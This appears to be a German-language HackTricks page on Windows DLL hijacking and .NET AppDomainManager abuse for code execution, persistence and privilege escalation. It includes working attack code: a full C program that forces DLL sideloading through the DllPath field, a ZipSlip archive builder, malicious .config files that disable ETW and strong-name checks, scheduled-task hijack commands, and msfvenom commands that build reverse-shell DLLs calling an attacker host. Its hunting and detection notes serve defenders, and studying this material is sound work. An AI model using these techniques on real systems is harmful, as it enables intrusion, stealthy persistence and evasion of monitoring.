# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Grundlegende Informationen

DLL Hijacking umfasst die Manipulation einer vertrauenswürdigen Anwendung, sodass sie eine schädliche DLL lädt. Dieser Begriff umfasst mehrere Taktiken wie **DLL Spoofing, Injection und Side-Loading**. Es wird hauptsächlich für Codeausführung und Persistenz sowie seltener für Privilege Escalation eingesetzt. Obwohl hier die Eskalation im Fokus steht, bleibt die Methode des Hijackings unabhängig vom Ziel gleich.

### Häufige Techniken

Für DLL Hijacking werden mehrere Methoden eingesetzt, wobei ihre Effektivität von der DLL-Ladestrategie der Anwendung abhängt:<sup>[[4]](#references)</sup>

1. **DLL Replacement**: Ersetzen einer legitimen DLL durch eine schädliche DLL, optional unter Verwendung von DLL Proxying, um die Funktionalität der ursprünglichen DLL zu erhalten.
2. **DLL Search Order Hijacking**: Platzieren der schädlichen DLL in einem Suchpfad vor der legitimen DLL, wobei das Suchmuster der Anwendung ausgenutzt wird.
3. **Phantom DLL Hijacking**: Erstellen einer schädlichen DLL, die eine Anwendung lädt, weil sie davon ausgeht, dass es sich um eine nicht vorhandene erforderliche DLL handelt.
4. **DLL Redirection**: Ändern von Suchparametern wie `%PATH%` oder `.exe.manifest`- / `.exe.local`-Dateien, um die Anwendung zur schädlichen DLL umzuleiten.
5. **WinSxS DLL Replacement**: Ersetzen der legitimen DLL durch ein schädliches Gegenstück im WinSxS-Verzeichnis, eine Methode, die häufig mit DLL side-loading verbunden ist.
6. **Relative Path DLL Hijacking**: Platzieren der schädlichen DLL in einem benutzerkontrollierten Verzeichnis zusammen mit der kopierten Anwendung, ähnlich den Techniken zur Binary Proxy Execution.


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

Klassisches DLL sideloading ist nicht die einzige Möglichkeit, einen vertrauenswürdigen **.NET Framework**-Prozess dazu zu bringen, Code eines Angreifers zu laden. Wenn die Ziel-EXE eine **managed** Anwendung ist, konsultiert die CLR auch eine nach der EXE benannte **application configuration file** (zum Beispiel `Setup.exe.config`). Diese Datei kann einen benutzerdefinierten **AppDomainManager** definieren. Wenn die Konfiguration auf eine vom Angreifer kontrollierte Assembly verweist, die neben der EXE platziert wurde, lädt die CLR sie **vor dem normalen Codepfad der Anwendung** und führt sie innerhalb des vertrauenswürdigen Prozesses aus.<sup>[[24]](#references)</sup>

Gemäß dem Konfigurationsschema von Microsoft für .NET Framework müssen sowohl `<appDomainManagerAssembly>` als auch `<appDomainManagerType>` vorhanden sein, damit der benutzerdefinierte Manager verwendet wird.<sup>[[16]](#references)[[17]](#references)</sup>

Minimale Konfiguration:
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
<appDomainManagerType value="EvilMgr.Loader" />
</runtime>
</configuration>
```
Minimaler Manager:
```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
[DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
}
}
```
Praktische Hinweise:
- Dies ist **spezifisches .NET-Framework-Tradecraft**. Es basiert auf dem Parsen der CLR-Konfiguration, nicht auf der Win32-DLL-Suchreihenfolge.
- Der Host muss tatsächlich eine **verwaltete EXE** sein. Schnelle Triage: `sigcheck -m target.exe`, `corflags target.exe` oder in den PE-Metadaten nach dem **CLR Runtime Header** suchen.
- Der Konfigurationsdateiname muss exakt dem Namen der ausführbaren Datei entsprechen (`<binary>.config`) und liegt normalerweise **neben der EXE**.
- Dies ist bei **signierten Microsoft-/Vendor-Binaries** nützlich, da die vertrauenswürdige EXE unverändert bleibt, während die bösartige verwaltete Assembly in-process ausgeführt wird.
- Wenn bereits ein beschreibbares Installer-/Update-Verzeichnis vorhanden ist, kann AppDomainManager-Hijacking als **erste Stufe** verwendet werden, gefolgt von klassischem DLL-Sideloading oder Reflective Loading für spätere Stufen.

### AppDomainManager als Downloader + Scheduled-Task-Bootstrap

Ein praktisches Intrusionsmuster besteht darin, die vertrauenswürdige verwaltete EXE sowohl mit einer bösartigen `*.config` als auch mit einer bösartigen AppDomainManager-DLL zu kombinieren, die ausschließlich als **kleiner Bootstrapper** fungiert:<sup>[[25]](#references)</sup>

1. Der Benutzer startet einen signierten .NET-Installer oder Updater von einem glaubwürdigen Speicherort wie `%USERPROFILE%\Downloads`.
2. Die angrenzende Konfiguration veranlasst die CLR, die Assembly des Angreifers zu laden, **bevor** die Logik der legitimen Anwendung startet.
3. Der bösartige Manager führt eine **Pfadprüfung** durch (beispielsweise nur fortfahren, wenn die Host-EXE aus `Downloads` ausgeführt wird, und die zweite Stufe nur aus `%LOCALAPPDATA%` starten lassen).
4. Wenn die Prüfung erfolgreich ist, lädt er das eigentliche Payload in einen benutzerbeschreibbaren Pfad wie `%LOCALAPPDATA%\PerfWatson2.exe` herunter und richtet die Persistenz mit einer Scheduled Task ein.

Warum diese Variante relevant ist:
- Die signierte Host-EXE bleibt unverändert, sodass eine Triage, die nur den Hash der Hauptdatei prüft, den Kompromittierungsfall möglicherweise übersieht.
- Einfache **pfadbasierte Anti-Analyse** ist üblich: Das Verschieben des ZIP-/EXE-/DLL-Trios auf den Desktop, nach Temp oder in einen Sandbox-Pfad kann die Kette absichtlich unterbrechen.
- Die AppDomainManager-DLL der ersten Stufe kann klein und unauffällig bleiben, während das eigentliche Implantat später abgerufen wird.

Minimales Persistenzbeispiel, das bei diesem Muster häufig zu sehen ist:
```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```
Hinweise:
- ` /rl highest` bedeutet **höchste verfügbare Berechtigungsstufe** für den jeweiligen Benutzer bzw. die jeweilige Sitzung; allein dadurch ist keine garantierte SYSTEM-Eskalation gegeben.
- Diese Technik wird häufig eher als **Ausführung/Persistenz durch .NET-Konfigurationsmissbrauch** kategorisiert und nicht als klassische Hijacking-Technik der DLL-Suchreihenfolge, obwohl Operatoren oft beides miteinander kombinieren.

Erkennungsansätze:
- Signierte .NET-Executables, die aus **ZIP-Entpackpfaden**, `Downloads`, `%TEMP%` oder anderen für Benutzer beschreibbaren Ordnern gestartet werden und über eine **kolokalisierte** `<exe>.config` verfügen.
- Neue geplante Tasks, deren Aktion auf `%LOCALAPPDATA%`, `%APPDATA%` oder `Downloads` verweist und deren Namen Browser-/Vendor-Updatern ähneln.
- Kurzlebige verwaltete Bootstrap-Prozesse, die sofort ein weiteres EXE herunterladen und anschließend `schtasks.exe` starten.
- Samples, die frühzeitig beendet werden, sofern der Pfad des Executables nicht einem erwarteten Benutzerprofilverzeichnis entspricht.

### Hijacking eines vorhandenen geplanten Tasks zum erneuten Starten der Sideload-Kette

Für Persistenz sollte nicht nur nach dem **Erstellen eines neuen Tasks** gesucht werden. Einige Intrusion Sets warten, bis ein legitimer Installer einen **normalen Updater-Task** erstellt, und **schreiben anschließend die Task-Aktion um**, sodass Name, Autor und Trigger für Defender weiterhin vertraut aussehen.

Wiederverwendbarer Ablauf:
1. Die legitime Software installieren bzw. ausführen und den Task identifizieren, den sie normalerweise erstellt.
2. Die Task-XML exportieren und die aktuellen Werte von `<Exec><Command>` / `<Arguments>` notieren.<sup>[[23]](#references)</sup>
3. Nur die Aktion ersetzen, sodass der Task dein **Trusted-Host-EXE** aus einem für Benutzer beschreibbaren Staging-Verzeichnis startet, das anschließend das eigentliche Payload per Sideloading oder AppDomain-Laden lädt.
4. Den gleichen Task-Namen erneut registrieren, anstatt ein neues, auffälliges Persistenz-Artefakt zu erstellen.
```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```
Warum es unauffälliger ist:
- Der Aufgabenname kann weiterhin legitim wirken (zum Beispiel wie ein Updater eines Anbieters).
- Der **Task Scheduler-Dienst** startet ihn, sodass die Validierung von übergeordneten Prozessen/Ancestors häufig die erwartete Scheduling-Kette sieht und nicht `explorer.exe`.
- DFIR-Teams, die nur nach **neuen Aufgabennamen** suchen, übersehen möglicherweise eine Aufgabe, deren Registrierung bereits vorhanden war, deren Aktion nun aber auf `%LOCALAPPDATA%`, `%APPDATA%` oder einen anderen vom Angreifer kontrollierten Pfad zeigt.

Schnelle Hunting-Ansatzpunkte:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- Vergleiche die XML-Dateien unter `C:\Windows\System32\Tasks\*` und die Metadaten unter `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` mit einer Baseline.
- Erzeuge einen Alert, wenn eine **wie ein Anbieter-Updater aussehende Aufgabe** aus **benutzerschreibbaren Verzeichnissen** ausgeführt wird oder eine .NET-EXE mit einer danebenliegenden `*.config`-Datei startet.

> [!TIP]
> Eine schrittweise Chain, die HTML-Staging, AES-CTR-Konfigurationen und .NET-Implants mit DLL sideloading kombiniert, findest du im folgenden Workflow.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Fehlende DLLs finden

Die häufigste Methode, fehlende DLLs innerhalb eines Systems zu finden, besteht darin, [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) aus den Sysinternals zu starten und die **folgenden 2 Filter zu setzen**:

![Common Techniques - Fehlende DLLs finden: Die häufigste Methode, fehlende DLLs innerhalb eines Systems zu finden, besteht darin, procmon aus den Sysinternals zu starten und die folgenden 2 Filter zu setzen](<../../../images/image (961).png>)

![Common Techniques - Fehlende DLLs finden: Die häufigste Methode, fehlende DLLs innerhalb eines Systems zu finden, besteht darin, procmon aus den Sysinternals zu starten und die folgenden 2 Filter zu setzen](<../../../images/image (230).png>)

und nur die **File System Activity** anzuzeigen:

![Common Techniques - Fehlende DLLs finden: und nur die File System Activity anzuzeigen](<../../../images/image (153).png>)

Wenn du nach **fehlenden DLLs im Allgemeinen** suchst, **lässt du** dies einige **Sekunden** laufen.\
Wenn du nach einer **fehlenden DLL innerhalb einer bestimmten ausführbaren Datei** suchst, solltest du einen **weiteren Filter wie "Process Name" "contains" `<exec name>`** setzen, sie ausführen und die Erfassung von Ereignissen beenden**.<sup>[[9]](#references)</sup>

## Fehlende DLLs ausnutzen

Um Privilegien zu eskalieren, besteht unsere beste Chance darin, eine **DLL schreiben zu können, die ein privilegierter Prozess zu laden versucht**, und zwar an einem **Ort, an dem danach gesucht wird**. Daher können wir eine DLL in einen **Ordner schreiben**, in dem **vor** dem Ordner gesucht wird, in dem sich die **ursprüngliche DLL** befindet (ungewöhnlicher Fall), oder wir können in einen **Ordner schreiben, in dem nach der DLL gesucht wird**, während die ursprüngliche **DLL in keinem Ordner vorhanden ist**.

### DLL Search Order

**In der** [**Microsoft-Dokumentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **findest du, wie DLLs genau geladen werden.**

**Windows-Anwendungen** suchen nach DLLs, indem sie eine Reihe **vordefinierter Suchpfade** in einer bestimmten Reihenfolge verwenden. DLL hijacking entsteht, wenn eine schädliche DLL strategisch in einem dieser Verzeichnisse platziert wird, sodass sie vor der echten DLL geladen wird. Um dies zu verhindern, sollte die Anwendung absolute Pfade verwenden, wenn sie auf die benötigten DLLs verweist.

Die **DLL search order auf 32-Bit-Systemen** sieht wie folgt aus:

1. Das Verzeichnis, aus dem die Anwendung geladen wurde.
2. Das Systemverzeichnis. Verwende die Funktion [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya), um den Pfad dieses Verzeichnisses abzurufen.(_C:\Windows\System32_)
3. Das 16-Bit-Systemverzeichnis. Es gibt keine Funktion, die den Pfad dieses Verzeichnisses abruft, aber es wird durchsucht. (_C:\Windows\System_)
4. Das Windows-Verzeichnis. Verwende die Funktion [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya), um den Pfad dieses Verzeichnisses abzurufen.
1. (_C:\Windows_)
5. Das aktuelle Verzeichnis.
6. Die Verzeichnisse, die in der PATH-Umgebungsvariable aufgeführt sind. Beachte, dass dies nicht den anwendungsbezogenen Pfad umfasst, der durch den Registrierungsschlüssel **App Paths** angegeben wird. Der Schlüssel **App Paths** wird bei der Berechnung des DLL-Suchpfads nicht verwendet.

Dies ist die **Standard**-Suchreihenfolge bei aktiviertem **SafeDllSearchMode**. Wenn es deaktiviert ist, rückt das aktuelle Verzeichnis auf den zweiten Platz vor. Um diese Funktion zu deaktivieren, erstelle den Registrierungswert **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** und setze ihn auf 0 (standardmäßig aktiviert).

Wenn die Funktion [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) mit **LOAD_WITH_ALTERED_SEARCH_PATH** aufgerufen wird, beginnt die Suche im Verzeichnis des ausführbaren Moduls, das **LoadLibraryEx** lädt.

Beachte schließlich, dass **eine DLL unter Angabe des absoluten Pfads anstelle nur ihres Namens geladen werden kann**. In diesem Fall wird nach dieser DLL **nur in diesem Pfad gesucht** (falls die DLL Abhängigkeiten besitzt, wird nach diesen gesucht, als wären sie nur per Namen geladen worden).

Es gibt weitere Möglichkeiten, die Suchreihenfolge zu verändern, aber ich werde sie hier nicht erklären.

### Einen beliebigen Dateischreibzugriff in einen Missing-DLL-Hijack umwandeln

1. Verwende **ProcMon**-Filter (`Process Name` = Ziel-EXE, `Path` endet mit `.dll`, `Result` = `NAME NOT FOUND`), um DLL-Namen zu sammeln, nach denen der Prozess sucht, die er aber nicht finden kann.<sup>[[14]](#references)</sup>
2. Wenn die Binärdatei nach einem **Zeitplan/einem Dienst** ausgeführt wird, wird eine DLL mit einem dieser Namen, die im **Anwendungsverzeichnis** (Suchreihenfolge-Eintrag #1) abgelegt wird, bei der nächsten Ausführung geladen. In einem Fall mit einem .NET-Scanner suchte der Prozess in `C:\samples\app\` nach `hostfxr.dll`, bevor er die echte Kopie aus `C:\Program Files\dotnet\fxr\...` lud.
3. Erstelle eine Payload-DLL (z. B. eine Reverse Shell) mit einem beliebigen Export: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Wenn dein Primitive ein **ZipSlip-ähnlicher beliebiger Schreibzugriff** ist, erstelle ein ZIP, dessen Eintrag aus dem Extraktionsverzeichnis herausführt, sodass die DLL im Anwendungsverzeichnis landet:
```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```
5. Stelle das Archiv im überwachten Inbox/Share bereit; wenn der Scheduled Task den Prozess erneut startet, lädt er die bösartige DLL und führt deinen Code unter dem Dienstkonto aus.

### Erzwingen von DLL sideloading über RTL_USER_PROCESS_PARAMETERS.DllPath

Eine fortgeschrittene Möglichkeit, den DLL-Suchpfad eines neu erstellten Prozesses deterministisch zu beeinflussen, besteht darin, beim Erstellen des Prozesses mit den nativen APIs von ntdll das Feld DllPath in RTL_USER_PROCESS_PARAMETERS zu setzen. Durch die Angabe eines vom Angreifer kontrollierten Verzeichnisses kann ein Zielprozess, der eine importierte DLL anhand ihres Namens auflöst (kein absoluter Pfad und keine Verwendung der sicheren Lade-Flags), gezwungen werden, eine bösartige DLL aus diesem Verzeichnis zu laden.

Wichtige Idee
- Erstelle die Prozessparameter mit RtlCreateProcessParametersEx und gib einen benutzerdefinierten DllPath an, der auf deinen kontrollierten Ordner zeigt (z. B. das Verzeichnis, in dem sich dein Dropper/Unpacker befindet).
- Erstelle den Prozess mit RtlCreateUserProcess. Wenn die Ziel-Binary eine DLL anhand ihres Namens auflöst, konsultiert der Loader den angegebenen DllPath während der Auflösung. Dadurch wird zuverlässiges DLL sideloading ermöglicht, selbst wenn sich die bösartige DLL nicht im selben Verzeichnis wie die Ziel-EXE befindet.

Hinweise/Einschränkungen
- Dies betrifft den erstellten Child-Prozess; es unterscheidet sich von SetDllDirectory, das nur den aktuellen Prozess betrifft.
- Das Ziel muss eine DLL anhand ihres Namens importieren oder mit LoadLibrary laden (kein absoluter Pfad und keine Verwendung von LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs und fest codierte absolute Pfade können nicht hijacked werden. Weitergeleitete Exports und SxS können die Priorität ändern.

Minimales C-Beispiel (ntdll, Wide Strings, vereinfachte Fehlerbehandlung):

<details>
<summary>Vollständiges C-Beispiel: Erzwingen von DLL sideloading über RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Beispiel für die praktische Nutzung
- Platziere eine malicious xmllite.dll (die erforderlichen Funktionen exportierend oder an die echte DLL weiterleitend) in deinem DllPath-Verzeichnis.
- Starte eine signierte Binary, die bekanntermaßen mithilfe der oben beschriebenen Technik nach xmllite.dll sucht. Der Loader löst den Import über den angegebenen DllPath auf und führt das Sideloading deiner DLL durch.

Diese Technik wurde in-the-wild beobachtet, um mehrstufige Sideloading-Ketten auszuführen: Ein initialer Launcher legt eine Helper-DLL ab, die anschließend eine von Microsoft signierte, hijackbare Binary mit einem benutzerdefinierten DllPath startet, um das Laden der DLL des Angreifers aus einem Staging-Verzeichnis zu erzwingen.<sup>[[6]](#references)</sup>


### .NET AppDomainManager hijacking via `.exe.config`

Bei **.NET Framework**-Zielen kann Sideloading **vor `Main()`** durchgeführt werden, ohne den Speicher zu patchen, indem die benachbarte **`.exe.config`**-Datei der Anwendung missbraucht wird. Statt sich ausschließlich auf die Win32-DLL-Suchreihenfolge zu verlassen, platziert der Angreifer eine legitime .NET-EXE neben einer malicious Config-Datei und einer oder mehreren vom Angreifer kontrollierten Assemblies.

So funktioniert die Chain:<sup>[[15]](#references)[[22]](#references)</sup>
1. Die Host-EXE startet und der **CLR liest `<exe>.config`**.
2. Die Config setzt **`<appDomainManagerAssembly>`** und **`<appDomainManagerType>`**, sodass die Runtime einen vom Angreifer kontrollierten `AppDomainManager` instanziiert.
3. Der malicious Manager erhält eine **Ausführung vor `Main()`** innerhalb des vertrauenswürdigen Host-Prozesses.
4. Dieselbe Config kann den CLR dazu zwingen, lokale Assemblies zuerst aufzulösen (zum Beispiel `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`), und kann die Runtime-Validierung bzw. Telemetrie ohne Inline-Patching abschwächen.

Campaign-ähnliches Muster (die genaue Verschachtelung kann je nach Direktive / CLR-Version variieren):
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="Updater" />
<appDomainManagerType value="MyAppDomainManager" />
<assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
<probing privatePath="." />
<publisherPolicy apply="no" />
</assemblyBinding>
<bypassTrustedAppStrongNames enabled="true" />
<etwEnable enabled="false" />
</runtime>
<startup>
<requiredRuntime version="v4.0.30319" safemode="true" />
</startup>
</configuration>
```
Warum dies nützlich ist:
- **`<probing privatePath="."/>`** hält die Assembly-Auflösung im Anwendungsverzeichnis und macht den Ordner zu einer vorhersehbaren Sideloading-Angriffsfläche.<sup>[[18]](#references)</sup>
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** verlagern die Ausführung während der CLR-Initialisierung in den Angreifercode, bevor die legitime Anwendungslogik ausgeführt wird.<sup>[[16]](#references)[[17]](#references)</sup>
- **`<bypassTrustedAppStrongNames enabled="true"/>`** kann es einer Full-Trust-Anwendung ermöglichen, nicht signierte oder manipulierte Assemblies zu laden, ohne dass die Strong-Name-Validierung fehlschlägt.<sup>[[19]](#references)</sup>
- **`<publisherPolicy apply="no"/>`** vermeidet Publisher-Policy-Weiterleitungen zu neueren Assemblies.<sup>[[20]](#references)</sup>
- **`<requiredRuntime ... safemode="true"/>`** macht die Auswahl der Runtime deterministischer.<sup>[[21]](#references)</sup>
- **`<etwEnable enabled="false"/>`** ist besonders interessant, da die **CLR ihre eigene ETW-Sichtbarkeit** über die Konfiguration deaktiviert, anstatt dass das Implantat `EtwEventWrite` im Speicher patcht.

In aktuellen Kampagnen beobachtetes Vorgehensmuster:
- In Stage 1 werden `setup.exe`, `setup.exe.config` und lokale Assemblies abgelegt.
- In Stage 2 werden sie in einen glaubwürdigen **AppData-Update**-Ordner kopiert, der Host in etwas wie `update.exe` umbenannt und anschließend über eine **scheduled task** erneut gestartet.
- In Stage 3 wird der Ausführungskontext überprüft (beispielsweise der erwartete über Task Scheduler gestartete übergeordnete Prozess `svchost.exe`), bevor die finale RAT-DLL bzw. der Export geladen wird.

Ansätze für die Suche:
- Signierte oder anderweitig legitime **.NET-Executables**, die mit verdächtigen benachbarten **`.config`**-Dateien an Orten ausgeführt werden, auf die Benutzer Schreibzugriff haben.
- `.config`-Dateien, die **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`** oder **`etwEnable enabled="false"`** enthalten.
- Scheduled Tasks, die umbenannte Update-Binaries aus **`%LOCALAPPDATA%`** oder anwendungsspezifischen `\bin\update\`-Verzeichnissen erneut starten.
- Übergeordnete/untergeordnete Prozessketten, bei denen eine Scheduled Task einen vertrauenswürdigen .NET-Host startet, der unmittelbar nicht vom Hersteller stammende Assemblies aus seinem eigenen Verzeichnis lädt.

#### Ausnahmen bei der DLL-Suchreihenfolge laut Windows-Dokumentation

Bestimmte Ausnahmen von der standardmäßigen DLL-Suchreihenfolge werden in der Windows-Dokumentation erwähnt:

- Wenn eine **DLL gefunden wird, die denselben Namen wie eine bereits im Speicher geladene DLL hat**, umgeht das System die übliche Suche. Stattdessen prüft es zunächst auf eine Redirection und ein Manifest, bevor es standardmäßig die bereits im Speicher befindliche DLL verwendet. **In diesem Szenario führt das System keine Suche nach der DLL durch**.
- Wenn die DLL für die aktuelle Windows-Version als **bekannte DLL** erkannt wird, verwendet das System seine Version der bekannten DLL sowie alle abhängigen DLLs, **wobei der Suchvorgang entfällt**. Der Registrierungsschlüssel **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** enthält eine Liste dieser bekannten DLLs.
- Sollte eine **DLL Abhängigkeiten haben**, wird die Suche nach diesen abhängigen DLLs so durchgeführt, als wären sie ausschließlich durch ihre **Modulnamen** angegeben, unabhängig davon, ob die ursprüngliche DLL über einen vollständigen Pfad identifiziert wurde.

### Eskalation von Berechtigungen

**Voraussetzungen**:

- Identifiziere einen Prozess, der unter **anderen Berechtigungen** ausgeführt wird oder ausgeführt werden soll (horizontale oder laterale Bewegung) und dem eine **DLL** fehlt.
- Stelle sicher, dass Schreibzugriff auf jedes **Verzeichnis** vorhanden ist, in dem nach der **DLL** gesucht wird. Dabei kann es sich um das Verzeichnis der ausführbaren Datei oder um ein Verzeichnis innerhalb des Systempfads handeln.

Ja, diese Voraussetzungen sind schwer zu finden, da es **standardmäßig ziemlich ungewöhnlich ist, eine privilegierte ausführbare Datei zu finden, der eine DLL fehlt**, und es ist noch **ungewöhnlicher, Schreibberechtigungen für einen Ordner in einem Systempfad zu haben** (standardmäßig ist das nicht möglich). In falsch konfigurierten Umgebungen ist dies jedoch möglich.\
Falls du Glück hast und die Voraussetzungen erfüllst, kannst du dir das [UACME](https://github.com/hfiref0x/UACME)-Projekt ansehen. Auch wenn das **Hauptziel des Projekts darin besteht, UAC zu umgehen**, findest du dort möglicherweise einen **PoC** für Dll hijaking für die jeweilige Windows-Version, den du verwenden kannst (wahrscheinlich musst du lediglich den Pfad des Ordners ändern, für den du Schreibberechtigungen hast).

Beachte, dass du **deine Berechtigungen für einen Ordner überprüfen kannst**, indem du Folgendes ausführst:<sup>[[5]](#references)</sup>
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
Und **überprüfe die Berechtigungen aller Ordner innerhalb von PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Sie können auch die Imports einer ausführbaren Datei und die Exports einer DLL mit Folgendem überprüfen:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Für eine vollständige Anleitung, wie man **Dll Hijacking zur Rechteausweitung missbraucht**, wenn Schreibberechtigungen in einem **Systempfadordner** vorhanden sind, siehe:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Automatisierte Tools

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)prüft, ob du Schreibberechtigungen für einen beliebigen Ordner innerhalb des System-PATH hast.\
Weitere interessante automatisierte Tools zum Erkennen dieser Schwachstelle sind **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ und _Write-HijackDll._

### Beispiel

Falls du ein ausnutzbares Szenario findest, wäre eines der wichtigsten Dinge für eine erfolgreiche Ausnutzung, **eine dll zu erstellen, die mindestens alle Funktionen exportiert, die die ausführbare Datei daraus importiert**. Beachte jedoch, dass Dll Hijacking nützlich ist, um eine Rechteausweitung von der **Medium Integrity level** zur **High Integrity level** **(unter Umgehung von UAC)** durchzuführen oder von[ **High Integrity zu SYSTEM**](../index.html#from-high-integrity-to-system)**.** Ein Beispiel dafür, **wie man eine gültige dll erstellt**, findest du in dieser Studie zu Dll Hijacking, die sich auf Dll Hijacking zur Ausführung konzentriert: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Außerdem findest du im **nächsten Abschnitt** einige **grundlegende dll-Codes**, die als **Vorlagen** oder zum Erstellen einer **dll mit exportierten, nicht erforderlichen Funktionen** nützlich sein können.

## **Erstellen und Kompilieren von Dlls**

### **Dll Proxifying**

Ein **Dll proxy** ist im Grunde eine Dll, die in der Lage ist, **deinen bösartigen Code bei ihrem Laden auszuführen**, aber auch **Funktionen bereitzustellen** und wie **erwartet zu funktionieren**, indem **alle Aufrufe an die echte Bibliothek weitergeleitet werden**.

Mit dem Tool [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) oder [**Spartacus**](https://github.com/Accenture/Spartacus) kannst du tatsächlich **eine ausführbare Datei angeben und die Bibliothek auswählen**, die du proxifizieren möchtest, und anschließend **eine proxifizierte dll generieren**, oder **die Dll angeben** und **eine proxifizierte dll generieren**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
